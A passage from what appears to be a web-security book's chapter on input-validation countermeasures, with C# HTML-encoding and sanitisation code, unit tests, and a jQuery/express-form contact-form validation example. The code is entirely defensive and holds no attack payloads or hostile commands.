          /// <param name="unencodedUserInput">The string that needs to be escaped.</param>
          /// <param name="numberOfEscapes">The number of escapes applied.</param>
          /// <returns>The escaped text.</returns>
          public static unsafe string HtmlEncode(
             this string unencodedUserInput,
             ref int numberOfEscapes
          ) {
             if (string.IsNullOrEmpty(unencodedUserInput))
                return string.Empty;
           
             StringWriter output = new StringWriter(CultureInfo.InvariantCulture);
              
             if (output == null)
                throw new ArgumentNullException("output");
             int num1 = IndexOfHtmlEncodingChars(unencodedUserInput);
             if (num1 == -1) {
                output.Write(unencodedUserInput);
             } else {
                int num2 = unencodedUserInput.Length - num1;
                fixed (char* chPtr1 = unencodedUserInput) {
                   char* chPtr2 = chPtr1;
                   while (num1-- > 0)
                      output.Write(*chPtr2++);
                   while (num2-- > 0) {
                      char ch = *chPtr2++;
                      if (ch <= 62) {
                         switch (ch) {
                            case '"':
                               output.Write("&quot;");
                               numberOfEscapes++;
                               continue;
                            case '&':
                               output.Write("&amp;");
                               numberOfEscapes++;
                               continue;
                            case '\'':
                               output.Write("&amp;#x27;");
                               numberOfEscapes = numberOfEscapes + 2;
                               continue;
                            case '<':
                               output.Write("&lt;");
                               numberOfEscapes++;
                               continue;
                            case '>':
                               output.Write("&gt;");
                               numberOfEscapes++;
                               continue;
                            case '/':
                               output.Write("&amp;#x2F;");
                               numberOfEscapes = numberOfEscapes + 2;
                               continue;
                            default:
                               output.Write(ch);
                               continue;
                         }
                      }
                      if (ch >= 160 && ch < 256) {
                         output.Write("&#");
                         output.Write(((int)ch).ToString(NumberFormatInfo.InvariantInfo));
                         output.Write(';');
                         numberOfEscapes++;
                      }
                      else
                         output.Write(ch);
                   }
                }
             }
             string encodedHtml = output.ToString();
             output.Dispose();
             return encodedHtml;
          }

          private static unsafe int IndexOfHtmlEncodingChars(string searchString) {
             int num = searchString.Length;
             fixed (char* chPtr1 = searchString) {
                char* chPtr2 = (char*)((UIntPtr)chPtr1);
                for (; num > 0; --num) {
                   char ch = *chPtr2;
                   if (ch <= 62) {
                      switch (ch) {
                         case '"':
                         case '&':
                         case '\'':
                         case '<':
                         case '>':
                         case '/':
                            return searchString.Length - num;
                      }
                   }
                   else if (ch >= 160 && ch < 256)
                      return searchString.Length - num;
                   ++chPtr2;
                }
             }
             return CharacterIndexNotFound;
          }
          
          private static char[] _htmlEntityEndingChars = new char[2] {
             ';',
             '&'
          };

          private static class HtmlEntities {
             private static string[] _entitiesList = new string[253] {
                "\"-quot",
                "&-amp",
                "'-apos",
                "<-lt",
                ">-gt",
                " -nbsp",
                "¡-iexcl",
                "¢-cent",
                "£-pound",
                "¤-curren",
                "¥-yen",
                "¦-brvbar",
                "§-sect",
                "¨-uml",
                "©-copy",
                "ª-ordf",
                "«-laquo",
                "¬-not",
                "\x00AD-shy",
                "®-reg",
                "¯-macr",
                "°-deg",
                "±-plusmn",
                "\x00B2-sup2",
                "\x00B3-sup3",
                "´-acute",
                "µ-micro",
                "¶-para",
                "·-middot",
                "¸-cedil",
                "\x00B9-sup1",
                "º-ordm",
                "»-raquo",
                "\x00BC-frac14",
                "\x00BD-frac12",
                "\x00BE-frac34",
                "¿-iquest",
                "À-Agrave",
                "Á-Aacute",
                "Â-Acirc",
                "Ã-Atilde",
                "Ä-Auml",
                "Å-Aring",
                "Æ-AElig",
                "Ç-Ccedil",
                "È-Egrave",
                "É-Eacute",
                "Ê-Ecirc",
                "Ë-Euml",
                "Ì-Igrave",
                "Í-Iacute",
                "Î-Icirc",
                "Ï-Iuml",
                "Ð-ETH",
                "Ñ-Ntilde",
                "Ò-Ograve",
                "Ó-Oacute",
                "Ô-Ocirc",
                "Õ-Otilde",
                "Ö-Ouml",
                "×-times",
                "Ø-Oslash",
                "Ù-Ugrave",
                "Ú-Uacute",
                "Û-Ucirc",
                "Ü-Uuml",
                "Ý-Yacute",
                "Þ-THORN",
                "ß-szlig",
                "à-agrave",
                "á-aacute",
                "â-acirc",
                "ã-atilde",
                "ä-auml",
                "å-aring",
                "æ-aelig",
                "ç-ccedil",
                "è-egrave",
                "é-eacute",
                "ê-ecirc",
                "ë-euml",
                "ì-igrave",
                "í-iacute",
                "î-icirc",
                "ï-iuml",
                "ð-eth",
                "ñ-ntilde",
                "ò-ograve",
                "ó-oacute",
                "ô-ocirc",
                "õ-otilde",
                "ö-ouml",
                "÷-divide",
                "ø-oslash",
                "ù-ugrave",
                "ú-uacute",
                "û-ucirc",
                "ü-uuml",
                "ý-yacute",
                "þ-thorn",
                "ÿ-yuml",
                "Œ-OElig",
                "œ-oelig",
                "Š-Scaron",
                "š-scaron",
                "Ÿ-Yuml",
                "ƒ-fnof",
                "\x02C6-circ",
                "˜-tilde",
                "Α-Alpha",
                "Β-Beta",
                "Γ-Gamma",
                "Δ-Delta",
                "Ε-Epsilon",
                "Ζ-Zeta",
                "Η-Eta",
                "Θ-Theta",
                "Ι-Iota",
                "Κ-Kappa",
                "Λ-Lambda",
                "Μ-Mu",
                "Ν-Nu",
                "Ξ-Xi",
                "Ο-Omicron",
                "Π-Pi",
                "Ρ-Rho",
                "Σ-Sigma",
                "Τ-Tau",
                "Υ-Upsilon",
                "Φ-Phi",
                "Χ-Chi",
                "Ψ-Psi",
                "Ω-Omega",
                "α-alpha",
                "β-beta",
                "γ-gamma",
                "δ-delta",
                "ε-epsilon",
                "ζ-zeta",
                "η-eta",
                "θ-theta",
                "ι-iota",
                "κ-kappa",
                "λ-lambda",
                "μ-mu",
                "ν-nu",
                "ξ-xi",
                "ο-omicron",
                "π-pi",
                "ρ-rho",
                "ς-sigmaf",
                "σ-sigma",
                "τ-tau",
                "υ-upsilon",
                "φ-phi",
                "χ-chi",
                "ψ-psi",
                "ω-omega",
                "ϑ-thetasym",
                "ϒ-upsih",
                "ϖ-piv",
                " -ensp",
                " -emsp",
                " -thinsp",
                "\x200C-zwnj",
                "\x200D-zwj",
                "\x200E-lrm",
                "\x200F-rlm",
                "–-ndash",
                "—-mdash",
                "‘-lsquo",
                "’-rsquo",
                "‚-sbquo",
                "“-ldquo",
                "”-rdquo",
                "„-bdquo",
                "†-dagger",
                "‡-Dagger",
                "•-bull",
                "…-hellip",
                "‰-permil",
                "′-prime",
                "″-Prime",
                "‹-lsaquo",
                "›-rsaquo",
                "‾-oline",
                "⁄-frasl",
                "€-euro",
                "ℑ-image",
                "℘-weierp",
                "ℜ-real",
                "™-trade",
                "ℵ-alefsym",
                "←-larr",
                "↑-uarr",
                "→-rarr",
                "↓-darr",
                "↔-harr",
                "↵-crarr",
                "⇐-lArr",
                "⇑-uArr",
                "⇒-rArr",
                "⇓-dArr",
                "⇔-hArr",
                "∀-forall",
                "∂-part",
                "∃-exist",
                "∅-empty",
                "∇-nabla",
                "∈-isin",
                "∉-notin",
                "∋-ni",
                "∏-prod",
                "∑-sum",
                "−-minus",
                "∗-lowast",
                "√-radic",
                "∝-prop",
                "∞-infin",
                "∠-ang",
                "∧-and",
                "∨-or",
                "∩-cap",
                "∪-cup",
                "∫-int",
                "∴-there4",
                "∼-sim",
                "≅-cong",
                "≈-asymp",
                "≠-ne",
                "≡-equiv",
                "≤-le",
                "≥-ge",
                "⊂-sub",
                "⊃-sup",
                "⊄-nsub",
                "⊆-sube",
                "⊇-supe",
                "⊕-oplus",
                "⊗-otimes",
                "⊥-perp",
                "⋅-sdot",
                "⌈-lceil",
                "⌉-rceil",
                "⌊-lfloor",
                "⌋-rfloor",
                "〈-lang",
                "〉-rang",
                "◊-loz",
                "♠-spades",
                "♣-clubs",
                "♥-hearts",
                "♦-diams"
             };    

             private static Dictionary<string, char> _lookupTable = GenerateLookupTable();    

             private static Dictionary<string, char> GenerateLookupTable() {
                Dictionary<string, char> dictionary =
                   new Dictionary<string, char>(StringComparer.Ordinal);
                foreach (string str in _entitiesList)
                   dictionary.Add(str.Substring(2), str[0]);
                return dictionary;
             }    

             public static char Lookup(string entity) {
                char ch;
                _lookupTable.TryGetValue(entity, out ch);
                return ch;
             }
          }
       }
    }

To drive the development of the `Sanitisation` API, I wrote the following tests and created a `MockedOperationContext`, code that is not included here. I also used RhinoMocks as the mocking framework, which is no longer being maintained. I would recommend NSubstitute instead as a mocking framework for .NET. We also used NLog, and wrapped it in `Common.Wrapper.Log`

{title="Drive sanitisation API development", linenos=off, lang=C#}
    using System;
    using System.ServiceModel;
    using System.ServiceModel.Channels;
    using NUnit.Framework;
    using System.Configuration;
    using Rhino.Mocks;
    using Common.Wrapper.Log;
    using Common.WcfMock;
    using Common.WcfHelpers.ErrorHandling.Exceptions;
     
    namespace Sanitisation.UnitTest {
       [TestFixture]
       public class SanitiseTest {
          private const string _myTestIpv4Address = "My.Test.Ipv4.Address";
          private readonly int _maxLengthHtmlEncodedUserInput =
             int.Parse(ConfigurationManager.AppSettings["MaxLengthHtmlEncodedUserInput"]);
          private readonly int _maxLengthHtmlDecodedUserInput =
             int.Parse(ConfigurationManager.AppSettings["MaxLengthHtmlDecodedUserInput"]);
          private readonly string _encodedUserInput_thatsMaxDecodedLength =
             @"One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.
    One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.
    One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.
    One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.
    One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.
    One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.";
          private readonly string _decodedUserInput_thatsMaxLength =
             @"One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.
    One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.
    One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.
    One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.
    One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.
    One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.";
     
          [Test]
          public void Sanitise_UserInput_WhenGivenNull_ShouldReturnEmptyString() {
             Assert.That(new Sanitise().UserInput(null), Is.EqualTo(string.Empty));
          }
     
          [Test]
          public void Sanitise_UserInput_WhenGivenEmptyString_ShouldReturnEmptyString() {
             Assert.That(new Sanitise().UserInput(string.Empty), Is.EqualTo(string.Empty));
          }

          [Test]
          public void Sanitise_UserInput_WhenGivenSanitisedString_ShouldReturnSanitisedString(
          ) {
             // Open the whitelist up in order to test the encoding without restriction.
             Assert.That(
                new Sanitise(whiteList: @"^[\w\s\.,#/&'<"">]+$").
                UserInput(_encodedUserInput_thatsMaxDecodedLength),
                Is.EqualTo(_encodedUserInput_thatsMaxDecodedLength)
             );
          }    

          [Test]
          [ExpectedException(typeof(SanitisationWcfException))]
          public void Sanitise_UserInput_ShouldThrowExceptionIfEscapedInputToLong() {
             // Truncated just for display. Create a string of 4001 characters.
             string fourThousandAndOneCharacters =
                "Four thousand characters.";
             string expectedError =
                "The un-modified string received from the client with " +
                "the following IP address: " +
                '"' + _myTestIpv4Address + "\" " +
                "exceeded the allowed maximum length of an escaped Html user input string. " +
                "The maximum length allowed is: " +
                _maxLengthHtmlEncodedUserInput +
                ". The length was: " +
                (_maxLengthHtmlEncodedUserInput+1) + ".";    

             using(new MockedOperationContext(StubbedOperationContext)) {
                try {
                   new Sanitise().UserInput(fourThousandAndOneCharacters);
                }
                catch(SanitisationWcfException e) {
                   Assert.That(e.Message, Is.EqualTo(expectedError));
                   Assert.That(e.UnsanitisedAnswer, Is.EqualTo(fourThousandAndOneCharacters));
                   throw;
                }
             }
          }    

          [Test]
          [ExpectedException(typeof(SanitisationWcfException))]
          public void Sanitise_UserInput_DecodedUserInputShouldThrowException_WhenMaxLengthHtmlDecodedUserInputIsExceeded() {
             char oneCharOverTheLimit = '.';
             string expectedError =
                "The string received from the client with the following IP address: " +
                "\"" + _myTestIpv4Address + "\" " +
                "after Html decoding exceded the allowed maximum length of" +
                " an un-escaped Html user input string." +
                Environment.NewLine +
                "The maximum length allowed is: " +
                _maxLengthHtmlDecodedUserInput +
                ". The length was: " +
                (_decodedUserInput_thatsMaxLength + oneCharOverTheLimit).Length +
                oneCharOverTheLimit;    

             using(new MockedOperationContext(StubbedOperationContext)) {
                try {
                   new Sanitise().UserInput(
                      _encodedUserInput_thatsMaxDecodedLength + oneCharOverTheLimit
                   );
                }
                catch(SanitisationWcfException e) {
                   Assert.That(e.Message, Is.EqualTo(expectedError));
                   Assert.That(
                      e.UnsanitisedAnswer,
                      Is.EqualTo(_encodedUserInput_thatsMaxDecodedLength + oneCharOverTheLimit)
                   );
                   throw;
                }
             }
          }    

          [Test]
          public void Sanitise_UserInput_ShouldLogAndSendEmail_IfNumberOfDecodedHtmlEntitiesDoesNotMatchNumberOfEscapes() {
             string encodedUserInput_with6HtmlEntitiesNotEscaped =
                _encodedUserInput_thatsMaxDecodedLength.Replace("&amp;#x2F;", "/");
             string errorWeAreExpecting =
                "It appears as if someone has circumvented the client side Html entity " +
                "encoding." + Environment.NewLine +
                "The requesting IP address was: " +
                "\"" + _myTestIpv4Address + "\" " +
                "The sanitised input we receive from the client was the following:" +
                Environment.NewLine +
                "\"" + encodedUserInput_with6HtmlEntitiesNotEscaped + "\"" +
                Environment.NewLine +
                "The same input after decoding and re-escaping on the server side was " +
                "the following:" +
                Environment.NewLine +
                "\"" + _encodedUserInput_thatsMaxDecodedLength + "\"";
             string sanitised;
             // setup _logger
             ILogger logger = MockRepository.GenerateMock<ILogger>();
             logger.Expect(lgr => lgr.logError(errorWeAreExpecting));    

             Sanitise sanitise = new Sanitise(@"^[\w\s\.,#/&'<"">]+$", logger);    

             using (new MockedOperationContext(StubbedOperationContext)) {
                // Open the whitelist up in order to test the encoding etc.
                sanitised = sanitise.UserInput(encodedUserInput_with6HtmlEntitiesNotEscaped);
             }    

             Assert.That(sanitised, Is.EqualTo(_encodedUserInput_thatsMaxDecodedLength));
             logger.VerifyAllExpectations();
          }              

          private static IOperationContext StubbedOperationContext {
             get {
                IOperationContext operationContext =
                   MockRepository.GenerateStub<IOperationContext>();
                int port = 80;
                RemoteEndpointMessageProperty remoteEndpointMessageProperty =
                   new RemoteEndpointMessageProperty(_myTestIpv4Address, port);
                operationContext.Stub(
                   oc => oc.IncomingMessageProperties[RemoteEndpointMessageProperty.Name]
                ).Return(remoteEndpointMessageProperty);
                return operationContext;
             }
          }
       }
    }

And finally the API code we used to perform the sanitisation:

{title="Sanitisation API", linenos=on, lang=C#}
    using System;
    using System.Configuration;
    // Todo : Ideally we should be using Dependency Injection.
    // Researched best candidate was Simple Injector.
    using OperationContext = System.ServiceModel.Web.MockedOperationContext;
    using System.ServiceModel.Channels;
    using Common.Security.Sanitisation;
    using Common.WcfHelpers.ErrorHandling.Exceptions;
    using Common.Wrapper.Log;
     
    namespace Sanitisation {
     
       public class Sanitise {
          private readonly string _whiteList;
          private readonly ILogger _logger;
     
          private string RequestingIpAddress {
             get {
                RemoteEndpointMessageProperty remoteEndpointMessageProperty =
                   OperationContext.Current.IncomingMessageProperties[
                      RemoteEndpointMessageProperty.Name
                   ] as RemoteEndpointMessageProperty;
                return (
                   (remoteEndpointMessageProperty != null) ?
                   remoteEndpointMessageProperty.Address :
                   string.Empty
                );
             }
          }

          /// <summary>
          /// Provides server side escaping of Html entities, and runs the supplied
          /// whitelist character filter over the user input string.
          /// </summary>
          /// <param name="whiteList">Should be provided by DI from the ResourceFile.</param>
          /// <param name="logger">
          /// Should be provided by DI. Needs to be an asynchronous logger.
          /// </param>
          /// <example>
          /// The whitelist can be obtained from a ResourceFile like so...
          /// <code>
          /// private Resource _resource;
          /// _resource.GetString("WhiteList");
          /// </code>
          /// </example>
          public Sanitise(string whiteList = "", ILogger logger = null) {
             _whiteList = whiteList;
             _logger = logger ?? new Logger();
          }

          /// <summary>
          /// 1) Check field lengths.         Client side validation may have been negated.
          /// 2) Check against white list.    Client side validation may have been negated.
          /// 3) Check Html escaping.         Client side validation may have been negated.
           
          /// Generic Fail actions:   * Drop the payload.
          ///                           No point in trying to massage and save,
          ///                           as it won't be what the user was expecting,
          ///                         * Add full error to a WCFException Message and throw.
          ///                         * WCF interception reads WCFException.MessageForClient,
          ///                           and sends it to the user.
          ///                         * On return, log the WCFException's Message.
          ///                         
          /// Escape Fail actions:    * Asynchronously Log and email full error to support.
           
           
          /// 1) BA confirmed 50 for text, and 400 for textarea.
          ///     As we don't know the field type, we'll have to go for 400."
          ///
          ///     First we need to check that we haven't been sent some huge string.
          ///     So we check that the string isn't longer than 400 * 10 = 4000.
          ///     10 is the length of our double escaped character references.
          ///     Or, we ask the business for a number."
          ///     If we fail here,
          ///        perform Generic Fail actions and don't complete the following steps.
          /// 
          ///     Convert all Html Entity Encodings back to their equivalent characters,
          ///        and count how many occurrences.
          ///
          ///     If the string is longer than 400,
          ///        perform Generic Fail actions and don't complete the following steps.
          /// 
          /// 2) check all characters against the white list
          ///     If any don't match,
          ///        perform Generic Fail actions and don't complete the following steps.
          /// 
          /// 3) re html escape (as we did in JavaScript), and count how many escapes.
          ///     If cnt > cnt of Html Entity Encodings back to their equivalent characters,
          ///        Perform Escape Fail actions. Return sanitised string.
          /// 
          ///     If we haven't returned, return sanitised string.
           
           
          /// Performs checking on the text passed in,
          ///    to verify that client side escaping and whitelist validation
          ///    has already been performed.
          /// Performs decoding, and re-encodes.
          ///    Counts that the number of escapes was the same,
          ///    otherwise we log and send email with the details to support.
          /// Throws exception if the client side validation failed to restrict the
          ///    number of characters in the escaped string we received.
          ///    This needs to be intercepted at the service.
          ///    The exceptions default message for client needs to be passed back to the user.
          ///    On return, the interception needs to log the exception's message.
          /// </summary>
          /// <param name="sanitiseMe"></param>
          /// <returns></returns>
          public string UserInput(string sanitiseMe) {
             if (string.IsNullOrEmpty(sanitiseMe))
                return string.Empty;
           
             ThrowExceptionIfEscapedInputToLong(sanitiseMe);
           
             int numberOfDecodedHtmlEntities = 0;
             string decodedUserInput =
                HtmlDecodeUserInput(sanitiseMe, ref numberOfDecodedHtmlEntities);
           
             if(!decodedUserInput.CompliesWithWhitelist(whiteList: _whiteList)) {
                string error =
                   "The answer received from client with the following IP address: " +
                   "\"" + RequestingIpAddress + "\" " +
                   "had characters that failed to match the whitelist.";
                throw new SanitisationWcfException(error);
             }
           
             int numberOfEscapes = 0;
             string sanitisedUserInput = decodedUserInput.HtmlEncode(ref numberOfEscapes);
           
             if(numberOfEscapes != numberOfDecodedHtmlEntities) {
                AsyncLogAndEmail(sanitiseMe, sanitisedUserInput);
             }
           
             return sanitisedUserInput;
          }

          /// <note>
          /// Make sure the logger is setup to log asynchronously
          /// </note>
          private void AsyncLogAndEmail(string sanitiseMe, string sanitisedUserInput) {
             // no need for SanitisationException    

             _logger.logError(
                "It appears as if someone has circumvented the client side " +
                "Html entity encoding." +
                Environment.NewLine +
                "The requesting IP address was: " +
                "\"" + RequestingIpAddress + "\" " +
                "The sanitised input we receive from the client was the following:" +
                Environment.NewLine +
                "\"" + sanitiseMe + "\"" +
                Environment.NewLine +
                "The same input after decoding and re-escaping on the " +
                "server side was the following:" +
                Environment.NewLine +
                "\"" + sanitisedUserInput + "\""
             );
          }

          /// <summary>
          /// This procedure may throw a SanitisationWcfException.
          /// If it does, ErrorHandlerBehaviorAttribute will need to pass the
          /// "messageForClient" back to the client from within the
          /// IErrorHandler.ProvideFault procedure.
          /// Once execution is returned,
          /// the IErrorHandler.HandleError procedure of ErrorHandlerBehaviorAttribute
          /// will continue to process the exception that was thrown in the way of
          /// logging sensitive info.
          /// </summary>
          /// <param name="toSanitise"></param>
          private void ThrowExceptionIfEscapedInputToLong(string toSanitise) {
             int maxLengthHtmlEncodedUserInput =
                int.Parse(ConfigurationManager.AppSettings["MaxLengthHtmlEncodedUserInput"]);
             if (toSanitise.Length > maxLengthHtmlEncodedUserInput) {
                string error =
                   "The un-modified string received from the client " +
                   "with the following IP address: " +
                   "\"" + RequestingIpAddress + "\" " +
                   "exceeded the allowed maximum length of " +
                   "an escaped Html user input string. " +
                   "The maximum length allowed is: " +
                   maxLengthHtmlEncodedUserInput +
                   ". The length was: " +
                   toSanitise.Length + ".";
                throw new SanitisationWcfException(error, unsanitisedAnswer: toSanitise);
             }
          }

          private string HtmlDecodeUserInput(
             string doubleEncodedUserInput,
             ref int numberOfDecodedHtmlEntities
          ) {
             string decodedUserInput =
                doubleEncodedUserInput.HtmlDecode(
                   ref numberOfDecodedHtmlEntities
                ).HtmlDecode(ref numberOfDecodedHtmlEntities) ??
                string.Empty;
             
             // if the decoded string is longer than MaxLengthHtmlDecodedUserInput throw
             int maxLengthHtmlDecodedUserInput =
                int.Parse(ConfigurationManager.AppSettings["MaxLengthHtmlDecodedUserInput"]);
             if(decodedUserInput.Length > maxLengthHtmlDecodedUserInput) {
                throw new SanitisationWcfException(
                   "The string received from the client with the following IP address: " +
                   "\"" + RequestingIpAddress + "\" " +
                   "after Html decoding exceded the allowed maximum length " +
                   "of an un-escaped Html user input string." +
                   Environment.NewLine +
                   "The maximum length allowed is: " +
                   maxLengthHtmlDecodedUserInput +
                   ". The length was: " +
                   decodedUserInput.Length + ".",
                   unsanitisedAnswer: doubleEncodedUserInput
                );
             }
             return decodedUserInput;
          }
       }
    }

As you can see, there is a lot more work on the server side than the client side.

##### Example in JavaScript and NodeJS {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-nodejs}

A>
A> Without sanitisation, things are a lot simpler.
A>

For the next example, we use a single page app, switching to `jQuery.validator` on the client side and `express-form` on the server side. Our example is a simple contact form. I have only shown the parts relevant to validation and filtering.

Once the jQuery plugin (which is a module) `validate` is loaded, jQuery is passed to it. The plugin extends the jQuery prototype with its `validate` method. Our contact.js script then loads in the browser. We then call `ContactForm.initContactForm();`. ContactForm is immediately invoked and returns an object, upon which we call `initContactForm()`.

We add a custom validation function to our `validator` by way of `addMethod`. This function will take the value being tested, the element itself and a regular expression to test against. You can see we use this function when we pass our rules within the `options` object to `validate` which internally passes them to its `validator`.

The `validate` documentation explains the sequence of events that your custom rules will be applied in.

We pass `options` containing:

* `rules`
* `messages`
* `submitHandler` which is bound to the native `submit` event

There are many other options you can provide. I think the code is fairly self explanatory:

{title="contact.js", linenos=off, lang=JavaScript}
    var ContactForm = function () {

       return {

          //Contact Form
          initContactForm: function () {
             // Validation
             $.validator.addMethod('fieldValidated', function (value, element, regexpr) {
                return regexpr.test(value);
             },
             'No dodgy characters thanks.');
             $("#sky-form3").validate({
                // Rules for form validation
                rules: {
                   name: {
                      required: true,
                      minlength: 2,
                      maxlength: 50,
                      fieldValidated: /^[a-zA-Z ']+$/
                   },
                   email: {
                      required: true,
                      email: true
                   },
                   message: {
                      required: true,
                      minlength: 10,
                      maxlength: 1000,
                      fieldValidated: /^[a-zA-Z0-9-_ \?.,]+$/
                   }
                },

                // Messages for form validation
                messages: {
                   name: {
                      required: 'Please enter your name'
                   },
                   email: {
                      required: 'Please enter your email address',
                      email: 'Please enter a VALID email address'
                   },
                   message: {
                      required: 'Please enter your message'
                   }
                },

                // Ajax form submition. For details see jQuery Form Plugin:
                // http://malsup.com/jquery/form/
                submitHandler: function (form) {
                   $(form).ajaxSubmit({
                      beforeSend: function () {
                         // Useful for doing things like adding wait spinners
                         // or any work you want to do before sending.
                         // Todo: I think we need a wait spinner here.
                      },
                      // type: 'POST' // Default;
                      dataType: 'json',
                      success: function (responseText, statusText) {
                         // Handle success
                      },
                      error: function (error) {
                         // Handle error
                      }
                   });
                },

                // Do not change code below
                errorPlacement: function(error, element) {
                   error.insertAfter(element.parent());
                }
             });
          }
       };
    }();

Shifting our attention to the server side now, we have the home route of the single page app. Within the home route, we also have the `/contact` route which uses the `express-form` middleware. You can see the middleware first in action on line 82.

{title="routes/home.js", linenos=on, lang=JavaScript}
    var logger = require('../util/logger');
    var form = require('express-form');
    var fieldToValidate = form.field;
    var os = require('os');    

    function home(req, res) {
       res.redirect('/');
    }

    function index(req, res) {
       res.render('home', { title: 'Home', id: 'home', brand: 'your brand' });
    }

    function validate() {
       return form(
          // trim is filtering. toBoolean is some simple sanitisation. The rest is validation.
          fieldToValidate('name').
             trim().
             required().
             minLength(2).
             maxLength(50).
             is(/^[a-zA-Z ']+$/), // Regex same as cleint side.
          fieldToValidate('email').
             trim().
             required().
             isEmail(),
          fieldToValidate('message').
             trim().
             required().
             minLength(10).
             maxLength(1000).
             is(/^[a-zA-Z0-9-_ \?.,]+$/), // Regex same as cleint side.
          fieldToValidate('subscribe-to-mailing-list').toBoolean(),
          // I discuss the next line of code as part of a solution to what
          // captchas are trying to solve below in the Captcha section.
          // Bots love to populate everything.
          fieldToValidate('bot-pot').maxLength(0)
       );
    }

    // Using express-form: req.form is the validated req.body
    function contact(req, res) {
       
       if(req.form.isValid)
          sendEmail(req, res);
       else {
          (function alertEmail() {
             var reqBody =
                'Body of contact request (server-side unvalidated): ' +
                JSON.stringify(req.body);
             var reqForm =
                'Form of contact request (server-side validated): ' +
                JSON.stringify(req.form);
             var validationErrors =
                'Errors produced by express-form validation: ' +
                req.form.errors;
             var details =
                os.EOL +
                reqBody +
                os.EOL +
                os.EOL +
                reqForm +
                os.EOL +
                os.EOL +
                validationErrors +
                os.EOL;
             // Logger.emailLoggerFailure shown in the Insufficient Logging section
             logger.crit(
                '',
                'Validation error for my website contact form. ',
                {details: details},
                logger.emailLoggerFailure
             );
          }());
          res.status(418).send({error: 'User input was not valid. Try teliporting instead.'});
       }
    }

    module.exports = function (app) {
       app.get('/', index);
       app.get('/home', home); 
       app.post('/contact', validate(), contact);
    };

Following is the routing module that loads all other routes

{title="routes/index.js", linenos=off, lang=JavaScript}
    // This module loads dynamically all routes modules located in the routes/ directory.
     
    'use strict';
    var fs = require('fs');
    var path = require('path');

    module.exports = function (app) {
       fs.readdirSync(path.join(__dirname)).forEach(function (file) {
          // Avoid to read this current file.
          if (file === path.basename(__filename)) { return; }

          // Load the route file.
          require('./' + file)(app);
       });
    };

Now our entry point into the application. We load routes on line 30.

{title="app.js", linenos=on, lang=JavaScript}
    var http = require('http');
    var express = require('express');
    var path = require('path');
    var morganLogger = require('morgan');
    // Due to bug in node-config the next line is needed before config is required.
    if (process.env.NODE_ENV === 'production')
       process.env.NODE_CONFIG_DIR = path.join(__dirname, 'config');
    // Yes the following are hoisted, but it's OK in this situation.
    var logger = require('./util/logger'); // Or use requireFrom module so no relative paths.
    var methodOverride = require('method-override');
    // body-parser needs to be added in the middleware stack before using
    // express-form: https://github.com/freewil/express-form/issues/21
    var bodyParser = require('body-parser');
    var errorHandler = require('errorhandler');
    var app = express();
    //...
    logger.init();
    app.set('port', process.env.PORT || 3000);
    app.set('views', __dirname + '/views');
    app.set('view engine', 'jade');
    //...
    // In order to utilise connect/express logger module in our third party logger,
    // Pipe the messages through.
    app.use(morganLogger('combined', {stream: logger.stream}));
    app.use(methodOverride());
    app.use(bodyParser.json());
    app.use(bodyParser.urlencoded({ extended: true }));
    app.use(express.static(path.join(__dirname, 'public')));
    //...
    require('./routes')(app);

    if ('development' == app.get('env')) {
       app.use(errorHandler({ dumpExceptions: true, showStack: true }));
       //...
    }
    if ('production' == app.get('env')) {
       app.use(errorHandler());
       //...
    }

    http.createServer(app).listen(app.get('port'), function(){
       logger.info(
          "Express server listening on port " + app.get('port') + ' in '
          + process.env.NODE_ENV + ' mode'
       );
    });

As I mentioned previously in the ["What is Validation"](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation) section, some of the libraries appear confused about the differences in the practises of validation, filtering, and sanitisation. For example, `express-form` has sanitisation functions that are under their ["Filter API"](https://github.com/freewil/express-form#filter-api). 
`entityEncode`, `entityDecode`, even the Type Coercion functions are actually sanitising rather than filtering.

Maybe it's semantics, but `toFloat`, `toInt`, and `ifNull` are actually sanitisation functions.

`trim` is filtering, but `toLower` is sanitisation again. These functions, listed in the documentation under the Filter API, should be in their specific sections to save confusion.

Refer to the section [above](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation) for a refresher on validation, filtering, and sanitisation if you need it.

##### Other things to think about {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-other-things-to-think-about}

* Try and make all of your specific input fields conform to well structured semantic types, such as dates, social security numbers, zip codes, email addresses, etc. This way the developer should be able to define a very strong validation, filtering, and sanitisation (if needed) specification for each one. This makes the task of assuring all input is safe before it reaches any execution contexts easier
* If the input field comes from a fixed set of options, such as a drop down list or radio buttons, then the input needs to match exactly one of the values offered to the user in the first place
* Database accounts (in fact all accounts) should use [least privilege](#web-applications-countermeasures-management-of-application-secrets-least-privilege)
* Well structured data, such as dates, social security numbers, zip codes, email addresses, etc. then the developer should be able to define a very strong validation pattern

#### Cross-Site Scripting (XSS) {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-cross-site-scripting}

This is a place holder section. The countermeasures are covered in the [Lack of Input Validation, Filtering and Sanitisation](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation) section.

### Cross-Site Request Forgery (CSRF)
![](images/ThreatTags/PreventionAVERAGE.png)

